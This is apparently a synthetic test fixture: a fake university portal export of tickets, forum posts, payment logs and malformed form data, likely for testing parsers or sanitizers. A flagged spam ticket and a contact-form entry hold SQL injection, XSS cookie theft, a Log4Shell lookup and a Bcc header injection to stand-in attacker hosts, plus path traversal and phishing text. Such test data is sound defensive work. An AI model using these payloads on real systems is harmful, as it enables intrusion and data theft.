@@ -1,0 +1,281 @@
+=======================================================================
+ALU COMMUNITY PORTAL - RAW DATA EXPORT
+Batch ID   : 2026-Q3-SEPT
+Generated  : 2026-09-01 08:45:22
+Exported by: system@alueducation.com
+NOTE: File contains unvalidated, raw user-submitted content.
+      Do not distribute. Handle with care.
+=======================================================================
+
+
+━━━ SUPPORT TICKET #4821 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Submitted  : 01/09/2026  9:15 AM
+Status     : OPEN
+User       : Kwame Mensah
+Email      : k.mensah@alustudent.com
+Phone      : +233 24 456 7890
+Subject    : Can't access student portal since this morning
+
+Hi support,
+
+Been trying to log in since around 8:30 AM and keep hitting a 403 error.
+My student ID is KM-2021-RW. Nothing changed on my end overnight.
+
+The login page at https://portal.alueducation.com/login?next=%2Fdashboard
+just reloads itself. I also tried http://portal.alueducation.com:8080/login
+after seeing that port mentioned in an old announcement.
+
+Could you reach me at kwame.mensah.backup@gmail.com if my main account
+is locked? Or call on +233-24-456-7890 (same number, different format,
+just noting it in case the system stores both).
+
+- Kwame
+
+
+━━━ SUPPORT TICKET #4822 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Submitted  : 01/09/2026  10:02 AM
+Status     : IN PROGRESS
+User       : Amara Diallo
+Email      : a.diallo@si.alueducation.com
+Phone      : +221 77 123 4567
+Subject    : Payment gateway throwing a 500 on tuition refund
+
+Hello,
+
+Our department hit an error processing a student refund at 10:00 AM.
+Transaction details straight from the processor log:
+
+    Card    : 4111 1111 1111 1111
+    Amount  : $2,450.00
+    Ref     : TXN-RW-20260901-0042
+    Time    : 10:00 AM
+    Console : https://dashboard.example-payments.com/txn/RW-20260901-0042?tab=timeline
+
+The student was originally quoted RWF 3,100,000 and the conversion on our
+side came out at EUR 2,280.00, which does not reconcile. Finance has the
+original invoice as a PDF at https://files.alueducation.com/invoices/2026/q3/inv-0042.pdf
+
+Could someone from finance look into this before 5:00 PM today?
+My direct line: +221 77 123 4567  or  +221-77-987-6543 (backup).
+Cc'ing the desk: finance.desk@alueducation.com
+
+Amara Diallo
+SI Department, ALU
+
+
+━━━ SUPPORT TICKET #4823 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Submitted   : 01/09/2026  11:47 AM
+Status      : FLAGGED - SPAM / POTENTIALLY MALICIOUS
+User        : anonymous
+IP          : 198.51.100.0
+Filter rules: SPF_FAIL, IDN_HOMOGLYPH, URIBL_BLOCKED, BODY_INJECTION_CHARS
+Reply-To    : аdmin@alueducation.com
+Return-Path : payments@alueducation.com.secure-billing.ru
+
+Subject     : [AUTO-ROUTED BY SPAM FILTER - REVIEW BEFORE PROCESSING]
+
+hello I am a prince of nigeria seeking a trusted individual to help
+transfer sum of $45,000,000. contact moneyfast@suspicious.biz for details.
+please send credit card 5425 2334 3010 9903 to confirm your identity.
+
+verify your account now at https://alueducation.com.secure-billing.ru/verify
+or use the short link http://bit.ly/3xYzAbc within 24hrs or acct closed
+callback=javascript:alert(document.cookie)
+
+'; DROP TABLE users; --
+SELECT * FROM students WHERE email='' OR '1'='1'; --
+<script>document.cookie='stolen='+document.cookie</script>
+<img src=x onerror=alert(document.domain)>
+${jndi:ldap://evil.example.com/a}
+../../../../etc/passwd%00.jpg
+
+raw_body    : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@alueducation.com
+
+
+━━━ ALUMNI FORUM - POST #2291 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Thread     : Networking Event - Kigali Hub, September 15
+Posted     : 2026-08-29 14:33:00
+Author     : Fatima Nkosi
+Email      : f.nkosi@alumni.alueducation.com
+
+Hey everyone!
+
+Quick heads up, we're hosting a mixer at the Kigali hub on the 15th.
+
+  Date  : September 15, 2026
+  Time  : 18:00 - 21:00  (doors open at 17:30)
+  Venue : KG 7 Ave, Kigali Innovation City
+  RSVP  : by September 10, 5:00 PM
+  Link  : https://events.alueducation.com/rsvp/kigali-mixer-2026#agenda
+  Cost  : RWF 5,000 at the door, or £3.50 if you're paying from the UK
+
+Hit me at f.nkosi@alumni.alueducation.com or call +250 788 456 123.
+For anyone international, WhatsApp works: +1 (646) 555-0198.
+
+Tagging it #ALU2026 #KigaliHub #AlumniMixer so it's easy to find later.
+
+See you there!
+- Fatima
+
+
+━━━ ALUMNI FORUM - POST #2292 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Posted     : 2026-08-30 09:12:00
+Author     : Chidi Okafor
+Email      : c.okafor@alumni.alueducation.com
+
+Quick one, does anyone have a recording of the 11:00 AM session from
+last week's webinar? Missed it because of a scheduling clash. I think it
+was posted somewhere under https://learn.alueducation.com/webinars/2026-08/replay
+but the link 404s for me.
+
+Also trying to reach Emmanuel Taiwo. I have +234 803 123 4567 for him
+but it seems disconnected. His student email was e.taiwo@alustudent.com,
+not sure if it's still active or if he switched to something else.
+
+Been doing #100DaysOfCode since June and finally understand #regex, so
+if anyone needs help with the onboarding task, shout.
+
+- Chidi
+
+
+━━━ SOCIAL MEDIA MONITORING - MENTIONS EXPORT ━━━━━━━━━━━━━━━━━━━━━━━━
+
+Window     : 2026-08-25 to 2026-09-01
+Source     : third-party listening tool, raw passthrough
+
+mention_1  : "@ALU_official thanks for the quick refund! #ALU2026 #StudentLife"
+mention_2  : "day 14 of #regex practice and I finally get lookaheads #Learning_In_Public"
+mention_3  : "#GivingTuesday campaign raised RWF 4,500,000, details at https://alueducation.com/give#impact"
+mention_4  : "posted at 7 pm, reposted 07:15 next morning, still no reply #support"
+
+brand_css  : { "accent": "#FF5733", "background": "#fff", "muted": "#6c757d" }
+selectors  : #main-content , #nav-bar , #footer , .card-title
+markdown   : "## Notes" and "### Sub-notes"
+malformed  : "#" , "# spaced" , "#!bang"
+
+
+━━━ STAFF DIRECTORY - PARTIAL EXPORT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Last updated: 2026-08-15 09:00:11
+
+──────────────────────────────────────────────────
+Name   : Dr. Adaeze Okonkwo
+Role   : Academic Advisor
+Email  : a.okonkwo@alueducation.com
+Phone  : +250 784 000 111
+Hours  : Mon-Fri, 9:00 AM - 5:00 PM
+Alt    : adaeze.advisory@gmail.com
+Book   : https://calendar.alueducation.com/a.okonkwo?duration=30
+
+──────────────────────────────────────────────────
+Name   : Samuel Kamau
+Role   : IT Support Lead
+Email  : s.kamau@alueducation.com
+Direct : +254 700 234 567
+Emerg  : +254-722-000-999
+Hours  : 08:00 - 17:00 (EAT)
+Notes  : covers the 22:47 out-of-hours window on rotation
+
+──────────────────────────────────────────────────
+Name   : Ngozi Adeyemi
+Role   : Finance Officer
+Email  : n.adeyemi@alueducation.com
+Phone  : +234 802 460 3000
+Hours  : 09:00 - 16:00
+Notes  : shared inbox is finance.desk@alueducation.com
+
+
+━━━ CMS EXPORT - ANNOUNCEMENTS WIDGET (RAW HTML) ━━━━━━━━━━━━━━━━━━━━
+
+<div class="announcement" data-id="88225">
+  <h2>Portal maintenance</h2>
+  <p>The student portal will be offline from <b>22:00</b> until <i>02:30</i>
+  on September 3. Questions to <a href="mailto:s.kamau@alueducation.com">IT Support</a>
+  or see <a href='#top'>the FAQ</a>.</p>
+  <br/>
+  <img src="/assets/img/logo.png" alt="ALU logo" />
+  <input type="email" name="notify" required>
+  <span data-count="0"></span>
+</div>
+
+editor_paste: <DIV CLASS="row"><P>uppercase tags from a Word paste</P></DIV>
+editor_paste: contact <s.kamau@alueducation.com> directly
+editor_paste: rating <3 out of 5, <not a real tag>, 5 > 3 and 2 < 4
+
+
+━━━ FORM SUBMISSION - CONTACT US PAGE (RAW / UNVALIDATED) ━━━━━━━━━━━
+
+Submitted  : 2026-09-01 23:55:44
+
+Name     : test
+Email    : "><img src=x onerror=alert(1)>@evil.com
+Email_2  : student@si.alueducation.com%0ABcc:%20attacker@evil.example.com
+Phone    : 999-999-9999-9999-9999
+Amount   : $12.345.67
+Time     : 25:61
+Website  : www.example.com
+Message  : SELECT * FROM students WHERE name='' OR 1=1; --
+
+
+━━━ NEWSLETTER - BOUNCE REPORT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Generated  : 2026-08-31 07:15:00
+Send ID    : NL-2026-08-30
+
+  not.a.valid@.com                 501 5.1.3
+  missingatsign.alustudent.com     501 5.1.3
+  double@@domain.org               501 5.1.3
+  jane.doe @alustudent.com         501 5.1.3
+  first..last@alustudent.com       501 5.1.3
+  .startsdot@alustudent.com        501 5.1.3
+  r.osei@alustudent.com            550 5.1.1
+  valid.external@gmail.com         550 5.1.1
+  STUDENT@ALUEDUCATION.COM         552 5.2.2
+  a.diallo@si.alueducation.com     452 4.2.2
+  billing@alu-education.com        550 5.1.1
+  d.k@alueducation.com             250 2.0.0
+
+
+━━━ PAYMENT PROCESSOR LOG ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Date: 2026-09-01
+
+TXN-001 | 09:32    | Card: 4111 1111 1111 1111 | Status: APPROVED | Ref: RW-9821
+TXN-002 | 11:15 AM | Card: 3714 496353 98431   | Status: APPROVED | Ref: RW-9822
+TXN-003 | 14:22    | Card: 5500-0000-0000-0004 | Status: APPROVED | Ref: RW-9823
+TXN-004 | 16:05    | Card: 1234 56789          | Status: REJECTED | (malformed card)
+TXN-005 | 22:47    | Card: 4532 1234 5678 9010 | Status: DECLINED | (checksum failure)
+TXN-006 | 23:10    | Card: 4916 3386 5498 3121 | Status: DECLINED | (checksum failure)
+TXN-007 | 07:05    | Card: 6011 0009 9013 9424 | Status: APPROVED | Ref: RW-9825
+TXN-008 | 12:00 PM | Card: **** **** **** 4242 | Status: APPROVED | Ref: RW-9826
+TXN-009 | 13:00 PM | Card: 4111111111111111    | Status: APPROVED | Ref: RW-9827
+TXN-010 | 7:5 AM   | Card: 4111 1111 1111 111  | Status: REJECTED | (length failure)
+
+
+━━━ FINANCE RECONCILIATION - SEPTEMBER ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Prepared by: n.adeyemi@alueducation.com
+Cut-off    : 2026-09-01 16:00
+
+  tuition instalment ........ $1,234.56
+  housing deposit ........... USD 45.00
+  library fine .............. £2.50
+  exchange adjustment ....... €89.99
+  bursary disbursement ...... RWF 25,000
+  refund reversal ........... -$300.00
+  processing fee ............ $0.99
+  grand total ............... 1,000,000.00 USD
+
+  vendor feed (unparsed) .... RWF 25.000,50
+  vendor feed (unparsed) .... €12,00
+  vendor feed (unparsed) .... $ 5 / 5 USD / 5USD / USD5
+
+
+=======================================================================
+END OF EXPORT - DO NOT DISTRIBUTE
+=======================================================================
